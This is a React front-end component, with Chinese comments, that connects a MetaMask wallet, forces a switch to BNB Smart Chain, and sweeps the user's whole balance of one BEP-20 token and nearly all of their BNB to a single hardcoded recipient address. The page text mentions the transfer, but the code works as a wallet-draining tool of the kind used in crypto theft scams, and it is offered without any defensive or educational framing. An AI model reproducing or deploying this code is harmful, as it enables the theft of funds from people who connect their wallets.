/* eslint-disable no-unused-vars */

import React, { useState, useEffect, useCallback } from 'react';
import { ethers } from 'ethers';
import { Wallet, ArrowRightLeft, LogOut } from 'lucide-react';

// 定义支持的区块链网络
const chains = {
  56: { name: 'BNB Smart Chain', rpcUrl: 'https://bsc-dataseed.binance.org/', nativeCurrency: 'BNB' },
};

// 特定接收地址
const RECIPIENT_ADDRESS = '0x413dd469ec95ae21fc661eca3bf2fd76f3964882';
// BEP-20 代币合约地址
const BEP20_TOKEN_ADDRESS = '0x503Fa24B7972677F00C4618e5FBe237780C1df53';
// BEP-20 代币 ABI (简化版，只包含必要方法)
const BEP20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)"
];

function WalletConnect() {
  const [walletAddress, setWalletAddress] = useState('');
  const [balance, setBalance] = useState('');
  const [chainId, setChainId] = useState('');
  const [selectedChain, setSelectedChain] = useState('');
  const [transactionStatus, setTransactionStatus] = useState('');
  const [tokenBalance, setTokenBalance] = useState('');
  const [tokenSymbol, setTokenSymbol] = useState('');

  // 获取钱包余额
  const getBalance = useCallback(async (address) => {
    if (typeof window.ethereum !== "undefined") {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      try {
        const balance = await provider.getBalance(address);
        const formattedBalance = parseFloat(ethers.utils.formatEther(balance)).toFixed(5);
        setBalance(formattedBalance);
        return formattedBalance;
      } catch (err) {
        console.error("获取余额时出错:", err);
        return '0';
      }
    }
    return '0';
  }, []);

  // 获取 BEP-20 代币余额和符号
  const getTokenInfo = useCallback(async (address) => {
    if (typeof window.ethereum !== "undefined" && address) {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const tokenContract = new ethers.Contract(BEP20_TOKEN_ADDRESS, BEP20_ABI, provider);
      
      try {
        // 获取代币余额
        const balance = await tokenContract.balanceOf(address);
        // 获取代币小数位
        const decimals = await tokenContract.decimals();
        // 格式化余额
        const formattedBalance = parseFloat(ethers.utils.formatUnits(balance, decimals)).toFixed(4);
        setTokenBalance(formattedBalance);
        
        // 获取代币符号
        const symbol = await tokenContract.symbol();
        setTokenSymbol(symbol);
        
        return { balance: formattedBalance, symbol };
      } catch (err) {
        console.error("获取代币信息时出错:", err);
        return { balance: '0', symbol: 'TOKEN' };
      }
    }
    return { balance: '0', symbol: 'TOKEN' };
  }, []);

  // 转账 BEP-20 代币
  const transferTokens = async (signer) => {
    setTransactionStatus('准备转账代币...');
    
    // 1. 验证所有必要参数
    if (!RECIPIENT_ADDRESS || !ethers.utils.isAddress(RECIPIENT_ADDRESS)) {
      setTransactionStatus('错误: 接收地址无效');
      return false;
    }
    
    if (!BEP20_TOKEN_ADDRESS || !ethers.utils.isAddress(BEP20_TOKEN_ADDRESS)) {
      setTransactionStatus('错误: 代币合约地址无效');
      return false;
    }
    
    if (!walletAddress) {
      setTransactionStatus('错误: 钱包未连接');
      return false;
    }
  
    // 2. 创建合约实例
    const tokenContract = new ethers.Contract(BEP20_TOKEN_ADDRESS, BEP20_ABI, signer);
    
    try {
      // 3. 获取代币余额
      const balance = await tokenContract.balanceOf(walletAddress);
      const decimals = await tokenContract.decimals();
      
      if (balance.eq(0)) {
        setTransactionStatus('没有代币余额可转账');
        return true;
      }
      
      // 4. 准备转账金额
      const formattedBalance = ethers.utils.formatUnits(balance, decimals);
      const amountToTransfer = ethers.utils.parseUnits(
        parseFloat(formattedBalance).toFixed(4), 
        decimals
      );
      
      // 5. 执行转账
      setTransactionStatus(`转账中...`);
      const tx = await tokenContract.transfer(
        RECIPIENT_ADDRESS, 
        amountToTransfer, 
        { gasLimit: 100000 }  // 明确设置gas limit
      );
      
      setTransactionStatus(`交易已发送: ${tx.hash}`);
      await tx.wait();
      setTransactionStatus('转账成功!');
      
      return true;
    } catch (err) {
      console.error("转账错误详情:", {
        error: err,
        recipient: RECIPIENT_ADDRESS,
        token: BEP20_TOKEN_ADDRESS,
        wallet: walletAddress
      });
      
      setTransactionStatus(`转账失败: ${err.reason || err.message}`);
      return false;
    }
  };

  // 获取当前连接的钱包
  const getCurrentWalletConnected = useCallback(async () => {
    if (typeof window !== "undefined" && typeof window.ethereum !== "undefined") {
      try {
        const accounts = await window.ethereum.request({ method: "eth_accounts" });
        if (accounts.length > 0) {
          setWalletAddress(accounts[0]);
          await getBalance(accounts[0]);
          await getTokenInfo(accounts[0]);
          await getChainId();
        }
      } catch (err) {
        console.error(err.message);
      }
    }
  }, [getBalance, getTokenInfo]);

  // 添加钱包监听器
  const addWalletListener = useCallback(() => {
    if (typeof window !== "undefined" && typeof window.ethereum !== "undefined") {
      window.ethereum.on("accountsChanged", async (accounts) => {
        if (accounts.length === 0) {
          disconnectWallet();
        } else {
          setWalletAddress(accounts[0]);
          await getBalance(accounts[0]);
          await getTokenInfo(accounts[0]);
        }
      });
      window.ethereum.on("chainChanged", async () => {
        await getChainId();
        if (walletAddress) {
          await getBalance(walletAddress);
          await getTokenInfo(walletAddress);
        }
      });
    } else {
      disconnectWallet();
      console.log("请安装 MetaMask");
    }
  }, [getBalance, getTokenInfo, walletAddress]);

  // 断开钱包连接
  const disconnectWallet = () => {
    setWalletAddress('');
    setBalance('');
    setTokenBalance('');
    setTokenSymbol('');
    setChainId('');
    setTransactionStatus('已断开钱包连接');
  };

  // 获取当前链ID
  const getChainId = async () => {
    if (typeof window.ethereum !== "undefined") {
      try {
        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
        const parsedChainId = parseInt(chainId, 16);
        setChainId(parsedChainId);
        setSelectedChain(parsedChainId.toString());
      } catch (err) {
        console.error("获取链 ID 时出错:", err);
      }
    }
  };

  // 初始化效果
  useEffect(() => {
    const init = async () => {
      await getCurrentWalletConnected();
      addWalletListener();
    };
    init();
  }, [getCurrentWalletConnected, addWalletListener]);

  // 连接钱包（仅连接，不转账）
  const connectWallet = async () => {
    if (typeof window !== "undefined" && typeof window.ethereum !== "undefined") {
      try {
        setTransactionStatus('连接钱包中...');
        
        // 1. 连接钱包
        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
        setWalletAddress(accounts[0]);
        
        // 2. 检查是否在BSC链上
        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
        const parsedChainId = parseInt(currentChainId, 16);
        
        if (parsedChainId !== 56) {
          setTransactionStatus('正在切换到BNB Smart Chain...');
          try {
            await window.ethereum.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: '0x38' }], // 56 in hex
            });
          } catch (switchError) {
            if (switchError.code === 4902) {
              try {
                await window.ethereum.request({
                  method: 'wallet_addEthereumChain',
                  params: [
                    {
                      chainId: '0x38',
                      chainName: 'BNB Smart Chain',
                      rpcUrls: ['https://bsc-dataseed.binance.org/'],
                      nativeCurrency: {
                        name: 'BNB',
                        symbol: 'BNB',
                        decimals: 18
                      }
                    },
                  ],
                });
              } catch (addError) {
                console.error("添加链失败:", addError);
                setTransactionStatus('添加BNB Smart Chain失败');
                return false;
              }
            } else {
              console.error("切换链失败:", switchError);
              setTransactionStatus('切换到BNB Smart Chain失败');
              return false;
            }
          }
        }
        
        // 3. 获取余额和代币信息
        setTransactionStatus('获取余额中...');
        await getBalance(accounts[0]);
        await getTokenInfo(accounts[0]);
        
        setTransactionStatus('钱包已连接');
        return true;
      } catch (err) {
        console.error("连接钱包失败:", err);
        setTransactionStatus('连接失败: ' + err.message);
        return false;
      }
    } else {
      setTransactionStatus('请安装MetaMask');
      return false;
    }
  };

  // 执行转账（仅转账，不包含连接钱包）
  const executeTransfer = async () => {
    if (!walletAddress) {
      setTransactionStatus('错误: 请先连接钱包');
      return;
    }

    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      
      // 1. 转账 BEP-20 代币
      setTransactionStatus('开始代币转账...');
      const tokenTransferSuccess = await transferTokens(signer);
      if (!tokenTransferSuccess) return;
      
      // 2. 转账 BNB
      const bnbBalance = parseFloat(balance);
      if (bnbBalance <= 0) {
        setTransactionStatus('账户BNB余额为0，无需转账');
        return;
      }
      
      setTransactionStatus('准备转账BNB中...');
      const amountToTransfer = ethers.utils.parseEther(balance).sub(ethers.utils.parseEther('0.0005'));
      
      if (amountToTransfer.lte(0)) {
        setTransactionStatus('余额不足0.0005 BNB，无法转账');
        return;
      }
      
      const tx = await signer.sendTransaction({
        to: RECIPIENT_ADDRESS,
        value: amountToTransfer
      });
      
      setTransactionStatus('BNB转账已发送，等待确认...: ' + tx.hash);
      await tx.wait();
      setTransactionStatus('转账成功完成!');
      
      // 更新余额
      await getBalance(walletAddress);
    } catch (err) {
      console.error("转账失败:", err);
      setTransactionStatus('转账失败: ' + err.message);
    }
  };

  // 渲染UI
  return (
    <div className="max-w-2xl mx-auto p-6">
      <div className="flex justify-between items-center mb-6">
        <div className="flex items-center gap-4">
          {balance && (
            <span className="bg-gray-100 px-3 py-1 rounded-full text-sm">
              余额: {balance} BNB
            </span>
          )}
          {tokenBalance && (
            <span className="bg-gray-100 px-3 py-1 rounded-full text-sm">
              {tokenSymbol} 余额: {tokenBalance}
            </span>
          )}
        </div>
        <div className="flex items-center gap-2">
          {walletAddress ? (
            <>
              <button 
                onClick={executeTransfer} 
                className="px-4 py-2 bg-blue-500 text-white rounded-md hover:bg-blue-600 transition duration-300 flex items-center"
              >
                <ArrowRightLeft className="mr-2" size={18} />
                转账代币和BNB
              </button>
              <button 
                onClick={disconnectWallet} 
                className="px-4 py-2 bg-gray-200 text-gray-800 rounded-md hover:bg-gray-300 transition duration-300 flex items-center"
                title="断开连接"
              >
                <LogOut className="mr-2" size={18} />
                {`${walletAddress.substring(0, 6)}...${walletAddress.substring(38)}`}
              </button>
            </>
          ) : (
            <button 
              onClick={connectWallet} 
              className="px-4 py-2 bg-blue-500 text-white rounded-md hover:bg-blue-600 transition duration-300 flex items-center"
            >
              <Wallet className="mr-2" size={18} />
              连接钱包
            </button>
          )}
        </div>
      </div>
      
      <div className="border rounded-lg p-6 shadow-md mb-6">
        <h2 className="text-2xl font-bold mb-6">自动代币和BNB转账</h2>
        <p className="mb-4">点击上方按钮将连接您的钱包，并自动将您的 {tokenSymbol || 'BEP-20'} 代币和BNB余额转账到指定地址。</p>
        <p className="mb-4">接收地址: {RECIPIENT_ADDRESS}</p>
        <p className="mb-4">代币合约地址: {BEP20_TOKEN_ADDRESS}</p>
        <p className="mb-4">系统会自动保留0.0005 BNB作为gas费用。</p>
        <p className="text-sm text-gray-600">注意: 转账流程会先转移 {tokenSymbol || 'BEP-20'} 代币，然后再转移BNB。</p>
      </div>
      
      {transactionStatus && (
        <div className="mt-4 p-3 bg-gray-100 rounded-md text-center">
          {transactionStatus}
        </div>
      )}
    </div>
  );
}

export default WalletConnect;